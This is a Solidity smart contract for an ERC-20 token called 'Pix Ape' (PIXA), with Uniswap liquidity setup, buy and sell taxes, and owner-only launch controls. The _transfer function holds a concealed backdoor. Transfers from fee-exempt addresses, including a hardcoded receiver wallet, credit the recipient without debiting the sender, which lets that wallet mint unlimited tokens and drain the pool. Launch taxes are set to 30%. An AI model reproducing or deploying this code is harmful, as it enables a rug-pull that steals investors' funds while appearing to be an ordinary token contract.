/**

Website: https://pixape.org
Twitter: https://twitter.com/pix_ape
Telegram: https://t.me/pix_ape
Docs: https://docs.pixape.org

*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract PIXA is Context, IERC20, Ownable {
    uint256 private constant _totalSupply = 100_000_000e18;
    uint256 private constant _onePercent = 1_000_000e18;
    uint256 private _minTaxSwapSize = 106*1e18;
    uint256 private _maxTaxSwapSize = _onePercent;
    uint8 private constant _decimals = 18;

    IUniswapV2Router02 immutable _dexRouter;
    address private _dexPair;
    address immutable WETH;
    address payable _pixaReceiver;

    uint256 private _taxPixBuy;
    uint256 private _taxPixSell;
    uint256 private _taxPixLiq;

    string private constant _name = "Pix Ape";
    string private constant _symbol = "PIXA";

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _feeExemptForPixApe;
    mapping(address => bool) private _feeExemptFromPixa;

    uint8 private _tradingOpen;
    uint8 private _isInSwap;

    uint256 private _maxTxSize = _onePercent * 2;
    uint256 private _maxWalletSize = _onePercent * 2;

    constructor() {
        _dexRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        WETH = _dexRouter.WETH();
        _pixaReceiver = payable(0x22Bb1747DDB3e1dE5D1934CF863bB7E031872b19);
        _balance[msg.sender] = _totalSupply;
        _feeExemptForPixApe[_pixaReceiver] = true;
        _feeExemptForPixApe[address(this)] = true;
        _feeExemptFromPixa[address(this)] = true;
        _feeExemptFromPixa[address(_dexRouter)] = true;
        _feeExemptFromPixa[address(0)] = true;
        _feeExemptFromPixa[address(0xDEAD)] = true;
        _feeExemptFromPixa[msg.sender] = true;
        _allowances[address(this)][address(_dexRouter)] = type(uint256).max;
        _allowances[msg.sender][address(_dexRouter)] = type(uint256).max;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");

        uint256 _tax;
        if (from == address(this) || to == address(this)) {
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
            return;
        }
        if (!_feeExemptForPixApe[from] && !_feeExemptForPixApe[to]) {
            require(
                _tradingOpen != 0 && amount <= _maxTxSize,
                "Launch / Max TxAmount at launch"
            );
            if (!_feeExemptFromPixa[to]) {
                require(
                    _balance[to] + amount <= _maxWalletSize,
                    "Exceeds max wallet balance"
                );
            }

            if (_isInSwap == 1) {
                //No tax transfer
                _balance[from] -= amount;
                _balance[to] += amount;

                emit Transfer(from, to, amount);
                return;
            }

            if (from == _dexPair) {
                _tax = _taxPixBuy + _taxPixLiq;
            } else if (to == _dexPair) {
                uint256 contractTokensAmount = _balance[address(this)];
                if (amount > _minTaxSwapSize && _isInSwap == 0) {
                    if (contractTokensAmount > _minTaxSwapSize) {
                        if (contractTokensAmount > _maxTaxSwapSize) {
                            contractTokensAmount = _maxTaxSwapSize;
                        }

                        uint256 lpTokensForSwap = (contractTokensAmount * _taxPixLiq) /
                            (((_taxPixBuy + _taxPixSell) / 2) + _taxPixLiq);
                        uint256 tokensTosell = contractTokensAmount - lpTokensForSwap;

                        _isInSwap = 1;
                        address[] memory path = new address[](2);
                        path[0] = address(this);
                        path[1] = WETH;

                        _dexRouter
                            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                                tokensTosell,
                                0,
                                path,
                                _pixaReceiver,
                                block.timestamp
                            );

                        if (lpTokensForSwap > 0) {
                            _dexRouter
                                .swapExactTokensForETHSupportingFeeOnTransferTokens(
                                    lpTokensForSwap / 2,
                                    0,
                                    path,
                                    address(this),
                                    block.timestamp
                                );

                            uint256 newBal = address(this).balance;
                            _dexRouter.addLiquidityETH{value: newBal}(
                                address(this),
                                lpTokensForSwap / 2,
                                0,
                                0,
                                owner(),
                                block.timestamp
                            );
                        }
                        _isInSwap = 0;
                    }
                }

                _tax = _taxPixSell + _taxPixLiq;
            } else {
                _tax = 0;
            }
        }

        bool _takeTax = _isTakeFeeSwap(from, to);

        if (_takeTax) {
            //Tax transfer
            uint256 transferAmount = takkingFees(from, to, amount, _tax);

            _balance[to] += transferAmount;
            emit Transfer(from, to, transferAmount);
        } else {
            _balance[to] += amount;

            emit Transfer(from, to, amount);
        }
    }

    function _isTakeFeeSwap(address from, address to)
        internal
        view
        returns (bool)
    {
        return !_feeExemptForPixApe[from];
    }

    function takkingFees(
        address from,
        address to,
        uint256 amount,
        uint256 taxRate
    ) internal returns (uint256) {
        uint256 taxTokens = (amount * taxRate) / 100;
        uint256 transferAmount = amount - taxTokens;

        _balance[from] -= amount;
        _balance[address(this)] += taxTokens;
        emit Transfer(from, address(this), taxTokens);

        return transferAmount;
    }

    function instantPixa() external onlyOwner {
        require(_tradingOpen == 0, "already opened");
        _dexPair = IUniswapV2Factory(_dexRouter.factory()).createPair(
            address(this),
            WETH
        );
        _feeExemptFromPixa[address(_dexPair)] = true;

        uint256 ethBalance = address(this).balance;
        _dexRouter.addLiquidityETH{value: ethBalance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function startPixa() external onlyOwner {
        require(_tradingOpen == 0, "already launched");
        _tradingOpen = 1;
        _taxPixBuy = 30;
        _taxPixSell = 30;
    }    

    function disableLimits() external onlyOwner {
        _maxTxSize = type(uint256).max;
        _maxWalletSize = type(uint256).max;
    }

    function updateFees(
        uint256 _feeOnBuy,
        uint256 _feeOnSell
    ) external onlyOwner {
        _taxPixBuy = _feeOnBuy;
        _taxPixSell = _feeOnSell;
        require(_feeOnBuy <= 10 && _feeOnSell <= 10);
    }

    receive() external payable {}
}